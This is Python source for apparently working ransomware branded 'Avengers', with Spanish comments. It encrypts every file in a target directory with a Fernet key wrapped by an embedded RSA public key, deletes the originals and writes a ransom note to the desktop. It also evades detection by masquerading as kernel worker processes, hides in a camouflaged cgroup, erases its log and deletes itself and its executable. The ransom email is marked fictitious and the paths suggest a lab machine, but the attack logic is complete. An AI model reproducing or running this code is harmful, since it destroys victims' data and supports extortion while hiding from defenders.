import os
import sys
import base64
import time
import subprocess
import shutil

# --- Configuración de Rutas ---
TARGET_KALI_DESKTOP_PATH = "/home/ubuntu/Desktop" 
KEY_FILENAME = 'avenger.txt'
KEY_FILE_PATH = os.path.join(TARGET_KALI_DESKTOP_PATH, KEY_FILENAME)

# Nombre del script actual para auto-eliminación
CURRENT_SCRIPT_PATH = os.path.abspath(__file__)

# Nombres de los procesos para mimetizarse
MIMIC_PROCESS_NAME = "[kworker/u16:0]"
SELF_DELETE_MIMIC_PROCESS_NAME = "[ksoftirqd/0]" # Nuevo nombre para el script de auto-eliminación

# --- Clave Pública RSA Proporcionada (formato PEM) ---
RSA_PUBLIC_KEY_PEM = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApN13s4vC999qDbdMGWh9
FgDMG0m8bvZvFmEovVMldNSSszBHEkra1IsDtkcmNdNP33+3UJ0bFmd+qrgJSs/8
NKXG6ayfJrpOj8/1P88/U14LTYuEnI5CCx865dlTAP0RBiqsgGcphn2g2lYnzAt9
+cM4n+rN4LckBM3q7jPhZNn3ErD/sEl46q7SpCk8OoBYtGloRfeF0XOIpoJ5iyXv
2bZ8vRsoXYLubktzDkIqrCB0IWvAToB2C4H/Mr+8B6IgSME8ECsmACVyxg63p91+
+x/e3sGwCWZGU27zmS+2wpkJ2Sw7B7kAaZUMbwtmS1DFwJecx4Qu3zRWdi6/e5cd
ZQIDAQAB
-----END PUBLIC KEY-----"""

# --- Configuración de Límites de Recursos ---
TOTAL_SYSTEM_RAM_GB = 2 # Asegúrate de que esto coincida con la RAM real de tu Ubuntu
CPU_LIMIT_PERCENT = 1 # 1% de CPU
RAM_LIMIT_PERCENT = 1 # 1% de RAM

# Global para almacenar el cgroup_path si se establece correctamente
GLOBAL_CGROUP_PATH = None

def self_delete_executable():
    if getattr(sys, 'frozen', False):
        # Si estamos dentro de un ejecutable PyInstaller
        try:
            # sys.executable apunta a la ruta del ejecutable temporal desempaquetado
            exe_path = sys.executable
            os.remove(exe_path)
            
            # Borra el directorio temporal de PyInstaller (_MEIPASS)
            if hasattr(sys, '_MEIPASS'):
                shutil.rmtree(sys._MEIPASS, ignore_errors=True)
                
        except Exception as e:
            # Puedes registrar el error aquí para depuración si es necesario,
            # pero en un ransomware, se suele suprimir para no dejar rastro.
            pass

# --- Función set_resource_limits actualizada ---
def set_resource_limits():
    """
    Establece límites de recursos para el proceso usando cgroupfs (cgroups v2).
    Requiere permisos de superusuario y cgroups v2 configurados.
    """
    global GLOBAL_CGROUP_PATH

    try:
        pid = os.getpid()
        cgroup_base_path = "/sys/fs/cgroup"
        cgroup_name_camouflaged = f"user_process_limits_{pid}"
        cgroup_path = os.path.join(cgroup_base_path, cgroup_name_camouflaged)

        # Crear el directorio del cgroup
        os.makedirs(cgroup_path, exist_ok=True)

        # 1. Limitar CPU (usando cpu.max)
        cpu_quota = int(100000 * CPU_LIMIT_PERCENT / 100)
        cpu_period = 100000
        cpu_max_value = f"{cpu_quota} {cpu_period}"
        cpu_max_file = os.path.join(cgroup_path, "cpu.max")
        with open(cpu_max_file, "w") as f:
            f.write(cpu_max_value)

        # 2. Limitar Memoria (usando memory.max)
        memory_limit_bytes = int(TOTAL_SYSTEM_RAM_GB * 1024 * 1024 * 1024 * (RAM_LIMIT_PERCENT / 100))
        memory_max_file = os.path.join(cgroup_path, "memory.max")
        with open(memory_max_file, "w") as f:
            f.write(str(memory_limit_bytes))

        # 3. Añadir el proceso actual al cgroup
        cgroup_procs_file = os.path.join(cgroup_path, "cgroup.procs")
        with open(cgroup_procs_file, "w") as f:
            f.write(str(pid))
        
        # Almacenar la ruta globalmente para poder limpiarla después
        GLOBAL_CGROUP_PATH = cgroup_path

        print(f"\nINFO: Límites de recursos establecidos (cgroups v2) en '{cgroup_name_camouflaged}': CPU {CPU_LIMIT_PERCENT}%, Memoria {memory_limit_bytes / (1024*1024):.2f} MB.")

    except Exception as e:
        print(f"\nAdvertencia: No se pudieron establecer los límites de recursos mediante cgroups: {e}")
        print("Asegúrate de ejecutar el script con sudo y que los cgroups estén configurados en tu sistema.")

def clean_cgroup():
    """
    Limpia (borra) el directorio del cgroup si fue establecido.
    """
    global GLOBAL_CGROUP_PATH
    if GLOBAL_CGROUP_PATH and os.path.exists(GLOBAL_CGROUP_PATH):
        try:
            root_cgroup_procs_file = "/sys/fs/cgroup/cgroup.procs"
            if os.path.exists(root_cgroup_procs_file):
                with open(root_cgroup_procs_file, "w") as f:
                    f.write(str(os.getpid()))
            
            os.rmdir(GLOBAL_CGROUP_PATH)
            print(f"\nINFO: Cgroup '{GLOBAL_CGROUP_PATH}' borrado exitosamente. ✨")
            GLOBAL_CGROUP_PATH = None # Resetear la variable global
        except Exception as e:
            print(f"\nAdvertencia: No se pudo borrar el cgroup '{GLOBAL_CGROUP_PATH}': {e}")
            print("Puede que necesite borrarlo manualmente con 'sudo rmdir <ruta_del_cgroup>' si el error persiste.")

def get_public_rsa_key():
    """
    Carga la clave pública RSA desde la cadena PEM.
    """
    try:
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.backends import default_backend
        public_key = serialization.load_pem_public_key(
            RSA_PUBLIC_KEY_PEM.encode('utf-8'),
            backend=default_backend()
        )
        return public_key
    except Exception as e:
        print(f"\nError al cargar la clave pública RSA: {e} 🔑❌")
        sys.exit(1)


def create_ransom_message(encrypted_fernet_key_b64):
    """
    Genera el mensaje de rescate con ASCII art y la clave cifrada.
    """
    ascii_art = r"""
      
     ░█████╗░██╗░░░██╗███████╗███╗░░██╗░██████╗░███████╗██████╗░░██████╗
     ██╔══██╗██║░░░██║██╔════╝████╗░██║██╔════╝░██╔════╝██╔══██╗██╔════╝
     ███████║╚██╗░██╔╝█████╗░░██╔██╗██║██║░░██╗░█████╗░░██████╔╝╚█████╗░
     ██╔══██║░╚████╔╝░██╔══╝░░██║╚████║██║░░╚██╗██╔══╝░░██╔══██╗░╚═══██╗
     ██║░░██║░░╚██╔╝░░███████╗██║░╚███║╚██████╔╝███████╗██║░░██║██████╔╝
     ╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝░░╚══╝░╚═════╝░╚══════╝╚═╝░░╚═╝╚═════╝░
                                                    
█████████████████████████████████████████████████████████████████████████████
██  ¡ADVERTENCIA CRÍTICA!                                                  ██
██                                                                         ██
██  Tu sistema ha sido comprometido por un ataque de los VENGADORES.       ██
██  ¡El Capitán América, Soldado del Invierno, Iron Man y                  ██
██                   Hulk han tomado el control!                           ██
██                                                                         ██
██                                                                         ██ 
██  Para la **recuperación de tus archivos cifrados**,                     ██
██  por favor, para mas instrucciones:                                     ██
██                                                                         ██
██          avenger@gmail.com (¡Correo Ficticio!)                          ██
██                                                                         ██
██  No intentes descifrar por tu cuenta o podrías dañar los datos.         ██
██  Sigue las instrucciones cuidadosamente.                                ██
██                                                                         ██
█████████████████████████████████████████████████████████████████████████████

Guarda esta clave y paga: 

"""
    return ascii_art + encrypted_fernet_key_b64 + "No compartas esta clave con nadie más!!!!!"


def generate_fernet_key_and_encrypt_with_rsa():
    """
    Genera una clave Fernet (AES), la cifra con la clave pública RSA,
    y devuelve ambas.
    """
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import padding

    fernet_key = Fernet.generate_key()
    public_rsa_key = get_public_rsa_key()

    encrypted_fernet_key = public_rsa_key.encrypt(
        fernet_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    encrypted_fernet_key_b64 = base64.b64encode(encrypted_fernet_key).decode('utf-8')
    
    return fernet_key, encrypted_fernet_key_b64


def create_and_save_ransom_txt(encrypted_fernet_key_b64_for_txt, target_desktop_path):
    """
    Crea el archivo TXT con el mensaje de rescate y la clave cifrada.
    """
    current_key_file_path = os.path.join(target_desktop_path, KEY_FILENAME)
    
    full_message_content = create_ransom_message(encrypted_fernet_key_b64_for_txt)


    if not os.path.exists(target_desktop_path):
        try:
            os.makedirs(target_desktop_path, exist_ok=True)
        except Exception as e:
            print(f"\nERROR: No se pudo crear el directorio '{target_desktop_path}': {e} 📂❌")
            print("INFO: Intentando crear el archivo en /tmp/ como fallback.")
            current_key_file_path = os.path.join("/tmp/", KEY_FILENAME)
            target_desktop_path = "/tmp/"
            
    try:
        with open(current_key_file_path, 'w') as key_file:
            key_file.write(full_message_content)
        os.chmod(current_key_file_path, 0o644)
        print(f"\nÉXITO: Archivo '{KEY_FILENAME}' creado/actualizado en: {current_key_file_path} 😈")
        print(f"INFO: Permisos de '{KEY_FILENAME}' establecidos a 0o644 (legible por todos).\n")
    except Exception as e:
        print(f"\nERROR FATAL: No se pudo crear/guardar el archivo de clave en '{current_key_file_path}': {e} 💥")
        sys.exit(1)


def encrypt_file(filepath: str, key: bytes):
    """
    Cifra un archivo dado con la clave Fernet (AES).
    """
    try:
        f = Fernet(key)
        with open(filepath, 'rb') as file:
            original = file.read()
        encrypted_data = f.encrypt(original)
        
        encrypted_filepath = filepath + '.encrypted'
        with open(encrypted_filepath, 'wb') as encrypted_file:
            encrypted_file.write(encrypted_data)
        
        #print(f"Archivo cifrado: {filepath} -> {encrypted_filepath} 🔥")
        return True
    except Exception as e:
        print(f"\nError al cifrar {filepath}: {e} ❌")
        return False

def encrypt_directory(directory_path: str, target_desktop_path: str):
    """
    Recorre un directorio, cifra los archivos y elimina los originales.
    """
    if not os.path.isdir(directory_path):
        print(f"\nError: El directorio '{directory_path}' no existe. 🚫")
        return

    # Generar clave y crear nota de rescate primero, independientemente de los archivos encontrados
    fernet_key_for_encryption, encrypted_fernet_key_b64_for_txt = generate_fernet_key_and_encrypt_with_rsa()
    create_and_save_ransom_txt(encrypted_fernet_key_b64_for_txt, target_desktop_path)

    # Recopilar archivos elegibles y contarlos
    eligible_files_paths = []
    for root, _, files in os.walk(directory_path):
        for filename in files:
            filepath = os.path.join(root, filename)
            # Asegurarse de que el archivo no sea un script del atacante o el archivo de clave
            if (not filepath.endswith('.encrypted') and
                os.path.isfile(filepath) and
                os.path.basename(filepath) != os.path.basename(CURRENT_SCRIPT_PATH) and
                os.path.basename(filepath) != KEY_FILENAME and
                not (filepath.endswith('.sh') and os.path.basename(os.path.dirname(filepath)) == '.config' and 'autostart' in os.path.basename(os.path.dirname(filepath))) and
                not (filepath.endswith('.desktop') and os.path.basename(os.path.dirname(filepath)) == '.config' and 'autostart' in os.path.basename(os.path.dirname(filepath)))):
                eligible_files_paths.append(filepath)

    total_files_to_process = len(eligible_files_paths)

    if total_files_to_process == 0:
        print(f"\nINFO: No se encontraron archivos elegibles para cifrar en '{directory_path}'. 😬")
        print(f"\nProceso de cifrado completado. Archivos procesados: 0\nArchivos fallidos: 0")
        return

    processed_count = 0
    failed_count = 0
    deleted_count = 0

    print(f"\nIniciando cifrado y eliminación automática de originales. Saldo total de archivos a procesar: {total_files_to_process} 😈")

    current_file_num = 0
    for filepath in eligible_files_paths:
        current_file_num += 1
        
        time.sleep(0.01)
        
        if encrypt_file(filepath, fernet_key_for_encryption):
            try:
                os.remove(filepath)
            except Exception as e:
                print(f"\nError al eliminar el original {filepath}: {e} 🗑️")
        else:
            failed_count += 1

    print("\n--- Resumen del cifrado ---")
    print(f"Archivos cifrados exitosamente: {processed_count} 🔥")
    print(f"Archivos originales eliminados: {deleted_count} 💀")
    print(f"Revisa '{KEY_FILE_PATH}' para el mensaje de 'recuperación' con la clave cifrada. 🔑\n")
    if failed_count > 0:
        print("\nAdvertencia: Algunos archivos no pudieron ser cifrados. Revisa los errores. ⚠️")
    
    print(f"\nProceso de cifrado completado.\nArchivos procesados: {processed_count}\nArchivos fallidos: {failed_count}")


def delete_nohup_out():
    """
    Borra el archivo 'nohup.out' sin imprimir su contenido.
    Asume que 'nohup.out' está en el directorio de trabajo actual.
    """
    nohup_file_name = "nohup.out"
    nohup_file_path = os.path.join(os.getcwd(), nohup_file_name)

    if os.path.exists(nohup_file_path):
        try:
            os.remove(nohup_file_path)
            sys.stderr.write(f"\n--- Archivo '{nohup_file_name}' borrado exitosamente. ☠️ ---\n")
        except Exception as e:
            sys.stderr.write(f"ERROR: No se pudo borrar '{nohup_file_name}': {e}\n")
    else:
        sys.stderr.write(f"ADVERTENCIA: El archivo '{nohup_file_name}' no se encontró en '{os.getcwd()}'.\n")


def self_delete_script():
    """
    Crea un pequeño script temporal para auto-eliminar el script principal
    y luego se elimina a sí mismo. Ejecutado en segundo plano con un nombre de proceso crítico.
    """
    script_to_delete = CURRENT_SCRIPT_PATH
    
    temp_script_name = f"delete_me_{os.getpid()}.sh"
    temp_script_path = os.path.join("/tmp", temp_script_name)

    shell_script_content = f"""#!/bin/bash
        sleep 1
        rm -f -- "{script_to_delete}"
        rm -- "$0"
        """
    try:
        with open(temp_script_path, 'w') as f:
            f.write(shell_script_content)
        os.chmod(temp_script_path, 0o700)

        # Ejecuta el script temporal con nohup y un nombre de proceso mimetizado
        command = ['nohup', 'bash', '-c', f'exec -a "{SELF_DELETE_MIMIC_PROCESS_NAME}" bash "{temp_script_path}"']
        
        subprocess.Popen(command,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setpgrp)
        print(f"\nEl script '{os.path.basename(script_to_delete)}' se auto-eliminará pronto con el nombre de proceso '{SELF_DELETE_MIMIC_PROCESS_NAME}'. 👻")
        print(f"\nLagarto se borrará pronto 👻")
    except Exception as e:
        print(f"Error al intentar auto-eliminar el script: {e}")


if __name__ == "__main__":
    try:
        from cryptography.fernet import Fernet
        from cryptography.hazmat.primitives import serialization, hashes
        from cryptography.hazmat.primitives.asymmetric import padding
        from cryptography.hazmat.backends import default_backend
    except ImportError:
        print("\nError: Asegúrate de que todas las librerías necesarias estén instaladas. 📚")
        print("Por favor, instala 'cryptography' usando: pip install cryptography\n")
        sys.exit(1)
    
    if len(sys.argv) > 1:
        target_directory = sys.argv[1]
        if not os.path.isdir(target_directory):
            print(f"\nError: El directorio especificado '{target_directory}' no existe. 📁")
            sys.exit(1)
    else:
        print("\nError: Debes proporcionar la ruta completa del directorio a cifrar como argumento. 📝")
        # Aquí se mantiene la instrucción de uso
        print(f"Uso: sudo nohup bash -c 'exec -a \"{MIMIC_PROCESS_NAME}\" /usr/bin/python3 -u {CURRENT_SCRIPT_PATH} /ruta/a/directorio' > nohup.out &")
        sys.exit(1)

    print("---😎😎😎 Avengers 😎😎😎---\n")
    
    print(f"\nLa clave de recuperación se guardará en: {KEY_FILE_PATH}")

    # Llamamos a la función para establecer los límites de recursos
    set_resource_limits()

    # Ejecutar el proceso de cifrado
    encrypt_directory(target_directory, TARGET_KALI_DESKTOP_PATH)
    
    # Llama a la función de limpieza al final del script
    clean_cgroup()

    # Se llama a la función para borrar nohup.out sin imprimirlo
    delete_nohup_out()

    # Auto-eliminación del script
    self_delete_script()
    print("Proceso finalizado. Avengers unidos... 👋\n")
    self_delete_executable()

